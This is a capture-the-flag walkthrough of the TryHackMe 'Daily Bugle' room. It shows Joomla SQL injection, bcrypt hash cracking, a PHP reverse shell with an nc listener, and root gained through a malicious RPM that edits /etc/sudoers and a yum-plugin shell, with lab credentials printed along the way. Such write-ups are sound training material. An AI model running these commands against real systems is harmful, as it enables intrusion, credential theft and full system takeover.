# Daily Bugle

**Room Link:** [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle)



### **Deploy**

**Access the web server, who robbed the bank?**

<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

### Initial Shell

```
nmap -A 10.10.116.159
```

<figure><img src="../../.gitbook/assets/image (18) (2).png" alt=""><figcaption></figcaption></figure>



**Python Script**

```
git clone https://github.com/stefanlucas/Exploit-Joomla.git 
cd Exploit-Joomla/ 
python3 joomblah.py http://10.10.116.159
```

<figure><img src="../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>

```
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

### Cracking the hash

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

<figure><img src="../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

We can  now login to Joomla with the credentials we have found

```
Username: jonah
Password: spiderman123
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

All I did was follow this tutorial to get a reverse shell.&#x20;

**Tutorial:** [https://www.hackingarticles.in/joomla-reverse-shell/](https://www.hackingarticles.in/joomla-reverse-shell/)

**Kali**

```
nc -lvp 1234
```

**Browser**

<figure><img src="../../.gitbook/assets/image (22) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (4).png" alt=""><figcaption></figcaption></figure>

Used this PHP reverse shell, just needed to change the IP to my own.

**PHP Reverse Shell:** [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<figure><img src="../../.gitbook/assets/image (1) (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

### Privilege Escalation&#x20;

#### **Option #1 - Create malicious rpm file**

Found a password in the configuration file. The password worked for the user jjameson which was found in the home directory.

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

```
ssh jjameson@10.10.116.159
Password: nv5uz9r3ZEDzVjNu
```



jjamerson is able to run yum with no password as sudo

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**&#x20;

```
echo 'echo "jjameson ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > hack.sh 
git clone https://github.com/jordansissel/fpm.git 
cd fpm/bin/ 
./fpm -n root -s dir -t rpm -a all --before-install /root/hack.sh . 
python2 -m SimpleHTTPServer 81
```

Our fpm file is now created&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>

**Victim**&#x20;

```
cd /tmp/ 
wget http://10.10.160.125:81/root-1.0-1.noarch.rpm 
sudo yum localinstall root-1.0-1.noarch.rpm 
sudo -i
```

<figure><img src="../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>

#### **Option #2 -** Spawn interactive root shell by loading a custom plugin

**Exploit Link:** [https://gtfobins.github.io/gtfobins/yum/](https://gtfobins.github.io/gtfobins/yum/)

Just had to copy paste from gtfobins and it worked right away

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

<figure><img src="../../.gitbook/assets/image (1) (2) (3).png" alt=""><figcaption></figcaption></figure>

